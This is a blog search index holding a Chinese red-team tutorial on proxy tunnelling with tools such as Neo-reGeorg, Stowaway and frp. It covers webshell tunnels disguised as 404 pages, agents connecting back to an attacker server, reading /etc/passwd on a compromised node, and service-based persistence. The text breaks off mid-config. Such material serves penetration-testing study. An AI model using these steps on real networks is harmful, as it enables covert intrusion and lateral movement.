<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>红队-代理隧道</title>
      <link href="2022/12/19/%E7%BA%A2%E9%98%9F-%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/"/>
      <url>2022/12/19/%E7%BA%A2%E9%98%9F-%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/</url>
      
        <content type="html"><![CDATA[<h1 id="红队-代理隧道"><a href="#红队-代理隧道" class="headerlink" title="红队-代理隧道"></a>红队-代理隧道</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>啥是代理隧道：理论上，任何接入互联网的计算机都可以被访问，但事实上，内网的计算机由于安全问题而被防火墙等边界设备做一些策略隔离，从而不被外界访问或诸多限制。这时我们可以借助一些端口转发工具来建立边界设备允许的协议通信，从而使我们可以访问内网环境，或者说内网机器可以与我们建立通信。也就是说代理隧道就是我们进入内网的通道。</p><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>架设在客户机和目标主机之间，简单的说，就是客户端主动向代理发送一个请求，然后代理向服务器请求并将获取的内容返回给客户端</p><p><img src="/images/image-20220902231147705.png" alt="image-20220902231147705"></p><p>基本情况下：</p><p>监听本地一个端口,然后连接部署在远程WEB的webshell,远端的webshell会把端口转发请求转发到本地或者本地内网远程的主机</p><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><p><strong>Neo-reGeorg</strong> 是一个旨在积极重构 <a href="https://github.com/sensepost/reGeorg">reGeorg</a> 的项目</p><p>用法：</p><p>1、设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k password</span><br></pre></td></tr></table></figure><p>2、使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http://xx/tunnel.php -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>直接访问生成上传的的tunnel文件，显示自定义的404页面</p><p><img src="/images/image-20220902101325201.png" alt="image-20220902101325201"></p><p><img src="/images/image-20220902095004500.png" alt="image-20220902095004500"></p><p>tips：</p><p>1.支持生成的服务端，默认直接请求响应指定的页面内容 (如伪装的 404 页面)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k &lt;you_password&gt; --file <span class="number">404.</span>html --httpcode <span class="number">404</span></span><br></pre></td></tr></table></figure><p>连接 WEB 服务器，在本地建立 socks5 代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k password -u http:&#x2F;&#x2F;127.0.0.1&#x2F;tunnel.php -l 127.0.0.1 -p 8888 --skip</span><br></pre></td></tr></table></figure><p>2.如服务端 WEB，需要设置代理才能访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5://<span class="number">10.1</span><span class="number">.1</span><span class="number">.1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure><p>3.如需 Authorization 认证和定制的 Header 或 Cookie</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; -H <span class="string">&#x27;Authorization: cm9vdDppcyB0d2VsdmU=&#x27;</span> --cookie <span class="string">&quot;key=value;key2=value2&quot;</span></span><br></pre></td></tr></table></figure><p>4.分散请求，可上传到多个路径上，如内存马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k &lt;you_password&gt; -u &lt;url_1&gt; -u &lt;url_2&gt; -u &lt;url_3&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220902102007389.png" alt="image-20220902102007389"></p><p>5.开启内网转发，应对负载均衡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k &lt;you_password&gt; -u &lt;url&gt; -r &lt;redirect_url&gt;</span><br></pre></td></tr></table></figure><p>6.端口转发功能，非启动 socks5 服务 ( 127.0.0.1:1080 -&gt; ip:port )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k &lt;you_password&gt; -u &lt;url&gt; -t &lt;ip:port&gt;</span><br></pre></td></tr></table></figure><h3 id="tunna"><a href="#tunna" class="headerlink" title="tunna"></a>tunna</h3><p><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a></p><p>TLDR: Tunnels TCP connections over HTTP（通过HTTP封装隧道通信任何TCP）</p><p>用法：</p><p>1、将webshells中对应的conn文件传到相应的服务器上</p><p><img src="/images/image-20220902102957934.png" alt="image-20220902102957934"></p><p>2、攻击主机上执行如下命令，将内网服务器（2.0.0.1）的80端口映射到本地8888端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 proxy.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;conn.php -l 8888 -a 2.0.0.1 -r 80 -v</span><br></pre></td></tr></table></figure><p>即访问本地的8888端口即可访问2.0.0.1的80端口服务</p><p><img src="/images/image-20220902111129022.png" alt="image-20220902111129022"></p><p>tips：</p><p>1.数据包大小限制，有些webshell对大小有限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--buffer&#x3D;BUFFERSIZE, -b BUFFERSIZE*</span><br></pre></td></tr></table></figure><p>2.上游代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--up-proxy&#x3D;UPPROXY, -x</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--auth, -A Upstream proxy requires authentication  认证</span><br></pre></td></tr></table></figure><p>3.other</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--ping-interval&#x3D;PING_DELAY, -q PING_DELAY webshprx pinging thread interval (default &#x3D; 0.5)</span><br><span class="line"></span><br><span class="line">--start-ping, -s Start the pinging thread first - some services send data first (eg. SSH)</span><br><span class="line"></span><br><span class="line">--cookie, -C Request cookies</span><br><span class="line"></span><br><span class="line">--authentication, -t Basic authentication</span><br></pre></td></tr></table></figure><h3 id="reDuh-amp-reGeorg"><a href="#reDuh-amp-reGeorg" class="headerlink" title="reDuh&amp;reGeorg"></a>reDuh&amp;reGeorg</h3><p><a href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></p><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p><p>工具比较老，流量比较明显，目前只支持Python 2.7</p><p>用法：</p><p>1、将其下载的tunnel文件传到目标web目录</p><p><img src="/images/image-20220902121934201.png" alt="image-20220902121934201"></p><p>2、连接 WEB 服务器，在本地建立 socks5 代理，用法和Neo类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;tunnel.php</span><br></pre></td></tr></table></figure><p>tunnel.php在php5.3以后禁用掉了dl()函数，参考改成如下</p><p><a href="https://github.com/sensepost/reGeorg/issues/16">https://github.com/sensepost/reGeorg/issues/16</a></p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><img src="/images/image-20220902231124816.png" alt="image-20220902231124816"></p><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a href="https://github.com/ph4ntonn/Stowaway">https://github.com/ph4ntonn/Stowaway</a></p><p>Stowaway是一个利用go语言编写、专为渗透测试工作者制作的多级代理工具</p><p>用户可使用此程序将外部流量通过多个节点代理至内网，突破内网访问限制，构造树状节点网络，并轻松实现管理功能</p><p>Stowaway一共包含两种角色，分别是：</p><ul><li><code>admin</code> 渗透测试者使用的主控端</li><li><code>agent</code> 渗透测试者部署的被控端</li></ul><h4 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h4><p>admin开启监听，由于admin是交互式界面，这里推荐用screen运行，保证不会因ssh退出而中断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个screen</span><br><span class="line">screen -S stowaway</span><br><span class="line"># 开启监听</span><br><span class="line">.&#x2F;linux_x64_admin -l 443 -token 919e1c9c76957eeb6add61cd3b8bb4ce</span><br><span class="line"></span><br><span class="line"># 切换到后台</span><br><span class="line">ctrl+A+D</span><br><span class="line"># 显示screen创建的进程</span><br><span class="line">screen -ls</span><br><span class="line">#  切换到前台</span><br><span class="line">screen -r stowaway</span><br></pre></td></tr></table></figure><p>过云函数配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;admin -l 80 -token token -down ws</span><br></pre></td></tr></table></figure><p>交互式界面分为主界面<code>(admin) &gt;&gt;</code> 和节点界面<code>(node 0) &gt;&gt;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印帮助</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"><span class="comment"># 进入节点</span></span><br><span class="line">use [node number]</span><br><span class="line"><span class="comment"># 退出节点</span></span><br><span class="line">back</span><br><span class="line"><span class="comment"># 退出程序</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>主界面指令，指令可以tab补全</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打印节点拓扑图</span></span><br><span class="line">topo</span><br><span class="line"><span class="comment"># 打印节点详细信息</span></span><br><span class="line">detail</span><br></pre></td></tr></table></figure><p>强调一下encrypt指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加密agent连接参数，会返回一个加密字符串</span></span><br><span class="line">encrypt <span class="string">&quot;windows_x64_agent.exe -c 10.251.251.129:443 -token 919e1c9c76957eeb6add61cd3b8bb4ce&quot;</span></span><br><span class="line">encrypt <span class="string">&quot;linux_x64_agent -c x.x.x.x:443 -token 919e1c9c76957eeb6add61cd3b8bb4ce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># agent跟加密后的字符串连接admin</span></span><br><span class="line"><span class="comment"># ！！！注意文件名如果修改了，那么连接会失败</span></span><br><span class="line">C:\Users\Administrator\Documents\tools\stowaway\windows_x64_agent.exe AAAAAAAAAAAAAAAAAAAVktfRk5TWlBcV14rF11RMUFeVFcRRgpXB1hBSmpPU1E9VwYBCkJGCgpXDU8RPUxVUQ==</span><br><span class="line"></span><br><span class="line">./linux_x64_agent AAAAAAAAAAAAAATEQNVUlvVgQBbk9VUF9aXVtXT0xrSxYZKw4MAABUVVhXEEk8QVUDaVhSUgsRDl8PERxpSVVQbANfBwxADww=</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/image-20220902151207024.png" alt="image-20220902151207024"></p><p>执行agent并且跟上加密的字符串，成功连接</p><p><img src="/images/image-20220902151304065.png" alt="image-20220902151304065"></p><p><img src="/images/image-20220902151315085.png" alt="image-20220902151315085"></p><p>node指令，这里是讲扩展指令，其他指令查看stowaway文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 非交互式命令</span></span><br><span class="line">run &quot;cat /etc/passwd&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 内联命令，内联命令就是用代码实现的而不是调用的系统程序</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打印目前支持的命令</span></span><br><span class="line">inline help</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意下这里每个字符串之间都需要有空格，否则无法过滤。</span></span><br><span class="line">inline ps | grep admin</span><br></pre></td></tr></table></figure><p>节点间连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 连接其他节点</span><br><span class="line">connect x.x.x.x:9999</span><br><span class="line"># 监听其他节点的连接</span><br><span class="line">listen 9999</span><br></pre></td></tr></table></figure><p>开启socks5代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks 10003 pass@123 pass@123</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220902151511504.png" alt="image-20220902151511504"></p><p><img src="/images/image-20220902151538434.png" alt="image-20220902151538434"></p><p>PS: shell命令不要使用</p><h4 id="agent"><a href="#agent" class="headerlink" title="agent"></a>agent</h4><p>agent分为监听模式和主动连接模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 监听，这是明文的，需要在admin上用encrypt加密</span><br><span class="line">.&#x2F;agent -l 9999 -token token</span><br><span class="line"># 连接</span><br><span class="line">.&#x2F;agent -c 127.0.0.1:9999 -token token</span><br><span class="line"># 过云函数连接目标</span><br><span class="line">.&#x2F;agent -c 127.0.0.1:9999 -token token -up ws -domain xxx.aliyun.com</span><br></pre></td></tr></table></figure><h4 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">需要开启监听的node0机器上：</span><br><span class="line">encrypt &quot;linux_x64_agent -l 9999 -token 919e1c9c76957eeb6add61cd3b8bb4ce&quot;</span><br><span class="line"></span><br><span class="line">.&#x2F;linux_x64_agent AAAAAAAAAAAAAAAAAAAATEQCVUFmQQ8UchUIDgsaTFBfTB1uGw9XaFdeUFkRCQtYFBw7TgdXO1IFXQwWWAoL</span><br><span class="line"></span><br><span class="line">进入admin，进入需要连接的node节点</span><br><span class="line">connect 10.251.251.129:9999</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在stowaway中，组成多级网络需要借助admin中的listen、connect、 sshtunnel命令来实现</span><br><span class="line"></span><br><span class="line">举一个简单的例子</span><br><span class="line"></span><br><span class="line">admin: .&#x2F;stowaway_admin -l 9999 -s 123</span><br><span class="line">此时agent-1已经连上admin</span><br><span class="line"></span><br><span class="line">agent-1: .&#x2F;stowaway_agent -c 127.0.0.1:9999 -s 123</span><br><span class="line">此时用户还想连接agent-2，如下</span><br><span class="line"></span><br><span class="line">agent-2: .&#x2F;stowaway_agent -l 10000 -s 123</span><br><span class="line">那么，此时用户可以通过admin,输入use 0 -&gt; connect agent-2的IP:10000来将其加入网络，并成为agent-1的一个子节点</span><br><span class="line"></span><br><span class="line">-l 10000 -tls </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">假如此时用户还希望连入一个节点agent-3，但是通过agent-1无法访问agent-3</span><br><span class="line"></span><br><span class="line">那么，此时用户可以通过admin,输入use 0 -&gt; listen -&gt; 选择1.Normal Passive -&gt; 输入10001 从而使得agent-1监听在10001端口上，并等待子节点的连接</span><br><span class="line"></span><br><span class="line">等admin操作完成后，agent-3启动如下</span><br><span class="line"></span><br><span class="line">agent-3: .&#x2F;stowaway_agent -c 127.0.0.1:10001 -s 123</span><br><span class="line">就可以将agent-3作为agent-1的另一个子节点加入网络了</span><br><span class="line"></span><br><span class="line">关于listen以及sshtunnel的详细介绍，可以参看下方的命令解析</span><br></pre></td></tr></table></figure><h3 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h3><p><a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p><p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p><p>用法与Stowaway类似，具体看文档即可</p><p><img src="/images/image-20220902222709113.png" alt="image-20220902222709113"></p><h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p><a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。目前支持<strong>tcp、udp流量转发</strong>，可支持任何<strong>tcp、udp</strong>上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还<strong>支持内网http代理、内网socks5代理</strong>、<strong>p2p等</strong>，并带有功能强大的web管理端。</p><p>完整文档</p><p><a href="https://ehang-io.github.io/nps/#/?id=nps">https://ehang-io.github.io/nps/#/?id=nps</a></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><a href="https://github.com/ehang-io/nps/releases">releases</a></p><p>下载对应的系统版本即可，服务端和客户端是单独的</p><p>或者源码安装</p><ul><li>安装源码 <code>go get -u ehang.io/nps</code></li><li>编译</li></ul><p>服务端<code>go build cmd/nps/nps.go</code></p><p>客户端<code>go build cmd/npc/npc.go</code></p><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>下载完服务器压缩包后，解压，然后进入解压后的文件夹</p><ul><li>执行安装命令</li></ul><p>对于linux|darwin <code>sudo ./nps install</code></p><p>对于windows，管理员身份运行cmd，进入安装目录 <code>nps.exe install</code></p><ul><li>启动</li></ul><p>对于linux|darwin <code>sudo nps start</code></p><p>对于windows，管理员身份运行cmd，进入程序目录 <code>nps.exe start</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于&#x2F;etc&#x2F;nps</span><br></pre></td></tr></table></figure><p>停止和重启可用，stop和restart</p><p><strong>如果发现没有启动成功，可以使用<code>nps(.exe) stop</code>，然后运行<code>nps.(exe)</code>运行调试，或查看日志</strong>(Windows日志文件位于当前运行目录下，linux和darwin位于/var/log/nps.log)</p><ul><li>访问服务端ip:web服务端口（默认为8080）</li><li>使用用户名和密码登陆（默认admin/123，正式使用一定要更改）</li><li>创建客户端</li></ul><p>登录后点击右侧客户端，然后新增：</p><p><img src="/images/image-20220902230049932.png" alt="image-20220902230049932"></p><p><img src="/images/image-20220902230103132.png" alt="image-20220902230103132"></p><p>这里ID和密匙等会要用。</p><p>点击右侧socks代理，新增。ID为上面的id，端口填一个没有被占用的端口就好了，保存后server就配置完毕了。</p><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>1、无配置文件模式<br>将npc上传至机器，并执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npc.exe -server&#x3D;10.251.251.129:8024 -vkey&#x3D;8o8z9ksioubfbp11</span><br></pre></td></tr></table></figure><p>2、注册到系统服务(开机启动、守护进程)</p><p>对于linux、darwin</p><ul><li>注册：<code>sudo ./npc install 其他参数（例如-server=xx -vkey=xx或者-config=xxx）</code></li><li>启动：<code>sudo npc start</code></li><li>停止：<code>sudo npc stop</code></li><li>如果需要更换命令内容需要先卸载<code>./npc uninstall</code>，再重新注册</li></ul><p>对于windows，使用管理员身份运行cmd</p><ul><li>注册：<code>npc.exe install 其他参数（例如-server=xx -vkey=xx或者-config=xxx）</code></li><li>启动：<code>npc.exe start</code></li><li>停止：<code>npc.exe stop</code></li><li>如果需要更换命令内容需要先卸载<code>npc.exe uninstall</code>，再重新注册</li></ul><p>3、配置文件模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;npc -config&#x3D;npc配置文件路径</span><br></pre></td></tr></table></figure><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p><p>完整配置文档：<a href="https://gofrp.org/docs">https://gofrp.org/docs</a></p><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">代理</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn</span><br><span class="line"></span><br><span class="line">下载源码</span><br><span class="line">git clone github.com/fatedier/frp</span><br><span class="line"></span><br><span class="line">编译</span><br><span class="line">make -f Makefile.cross-compiles</span><br></pre></td></tr></table></figure><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p>frps.ini：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = <span class="number">10</span>.<span class="number">251</span>.<span class="number">251</span>.<span class="number">129</span></span><br><span class="line">bind_port = <span class="number">8880</span></span><br><span class="line">privilege_token = afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_only = true</span><br><span class="line">protocol = tcp</span><br><span class="line">dashboard_port = <span class="number">81</span></span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = Pass</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220902160004119.png" alt="image-20220902160004119"></p><h4 id="客户端命令行"><a href="#客户端命令行" class="headerlink" title="客户端命令行"></a>客户端命令行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -t 1.1.1.1 -p 8880</span><br></pre></td></tr></table></figure><h4 id="客户端配置文件"><a href="#客户端配置文件" class="headerlink" title="客户端配置文件"></a>客户端配置文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p>frpc.ini：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 10.251.251.129</span><br><span class="line">server_port &#x3D; 8880</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6001</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; admin</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220902155940657.png" alt="image-20220902155940657"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">vps:x.x.x.x</span><br><span class="line"></span><br><span class="line">vps的frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_ip &#x3D; x.x.x.x</span><br><span class="line">bind_port &#x3D; 8888</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_only &#x3D; true</span><br><span class="line">protocol &#x3D; tcp</span><br><span class="line">dashboard_port &#x3D; 81</span><br><span class="line">dashboard_user &#x3D; admin</span><br><span class="line">dashboard_pwd &#x3D; Pass</span><br><span class="line"></span><br><span class="line">一级代理：</span><br><span class="line"></span><br><span class="line">客户端1:</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 8888</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5-test1]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6001</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; admin</span><br><span class="line"></span><br><span class="line">二级代理：</span><br><span class="line"></span><br><span class="line">服务端2:</span><br><span class="line">[common]</span><br><span class="line">bind_ip &#x3D; 10.251.251.128</span><br><span class="line">bind_port &#x3D; 8118</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_only &#x3D; true</span><br><span class="line"></span><br><span class="line">客户端2:</span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 8888</span><br><span class="line">privilege_token &#x3D; afsafagwg8789yr89hiufaiu</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5-test2]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 